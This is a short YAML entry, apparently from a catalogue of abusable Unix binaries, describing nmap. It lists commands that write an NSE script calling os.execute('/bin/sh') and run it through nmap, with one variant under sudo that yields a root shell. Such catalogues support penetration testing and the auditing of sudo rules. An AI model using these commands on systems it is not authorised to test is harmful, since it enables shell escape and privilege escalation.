---
functions:
  execute-non-interactive:
    - code: echo "os.execute('/bin/sh')" > /tmp/script.nse
            nmap --script=/tmp/script.nse
  sudo-enabled:
    - code: echo "os.execute('/bin/sh')" > /tmp/script.nse
            sudo nmap --script=/tmp/script.nse
---
